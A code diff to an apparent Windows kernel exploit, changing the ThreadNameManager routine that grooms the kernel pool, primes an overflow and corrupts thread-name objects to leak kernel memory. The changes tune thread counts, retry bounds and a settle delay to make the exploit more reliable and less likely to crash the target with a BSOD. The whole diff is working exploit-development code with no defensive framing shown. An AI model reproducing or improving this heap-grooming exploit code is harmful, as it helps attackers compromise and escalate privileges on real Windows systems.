@@ -11,15 +11,19 @@ static const size_t THREADNAME_MAX_LEAK = 64 * 1024 * 1024; // 64 MB
 // exitEvent is created once in the constructor to ensure proper error handling
 static HANDLE exitEvent = NULL;
 
-// Tuned reliability/speed knobs from the best logged run.
-#undef THREADNAME_THREAD_COUNT
-#define THREADNAME_THREAD_COUNT 192
-#undef THREADNAME_MAX_USES_PER_LEAK
-#define THREADNAME_MAX_USES_PER_LEAK 256
-#undef THREADNAME_OVERFLOW_SETTLE_MS
-#define THREADNAME_OVERFLOW_SETTLE_MS 1
-#undef VERBOSE_LEAK_LOGS
+// Tunable reliability/speed knobs (respect config.h if provided)
+#ifndef THREADNAME_THREAD_COUNT
+#define THREADNAME_THREAD_COUNT 288
+#endif
+#ifndef THREADNAME_MAX_USES_PER_LEAK
+#define THREADNAME_MAX_USES_PER_LEAK 128
+#endif
+#ifndef THREADNAME_OVERFLOW_SETTLE_MS
+#define THREADNAME_OVERFLOW_SETTLE_MS 2
+#endif
+#ifndef VERBOSE_LEAK_LOGS
 #define VERBOSE_LEAK_LOGS 0
+#endif
 
 DWORD WINAPI DummyThread(LPVOID lpParam) {
 	// Wait on event; if event handle is invalid just exit
@@ -91,20 +95,15 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 	for (UINT64 i = 0; i < maxRetries; i++)
 	{
 		UINT64 tCount = THREADNAME_THREAD_COUNT;
-		if (i == 0) {
-			tCount = THREADNAME_THREAD_COUNT / 2;
-		}
-		else if (i < 3) {
-			tCount = (THREADNAME_THREAD_COUNT * 2) / 3;
-		}
-		else if (i < 4) {
-			tCount = THREADNAME_THREAD_COUNT;
-		}
-		else {
+		if (i == 1) {
+			tCount = THREADNAME_THREAD_COUNT + 32;
+		} else if (i == 2) {
 			tCount = THREADNAME_THREAD_COUNT + 64;
+		} else if (i > 2) {
+			tCount = THREADNAME_THREAD_COUNT + 96;
 		}
-		if (tCount < 128) tCount = 128;
-		if (tCount > 448) tCount = 448;
+		if (tCount < 160) tCount = 160;
+		if (tCount > 384) tCount = 384;
 
 		CreateThreads(tCount);
 		Hvergelmir::getInstance().PrimeOverflow(iChunkSize);
@@ -125,6 +124,8 @@ bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 
 		}
 		DEBUG_PRINT("       Retrying Pool Layout\n");
 		ClearThreads();
+		// Allow LFH to settle a touch between retries to reduce BSOD risk
+		Sleep(2);
 
 	}
 	DEBUG_PRINT(" [!] Failed to Corrupt ThreadName, Likelyhood of BSOD is HIGH! Exiting\n");
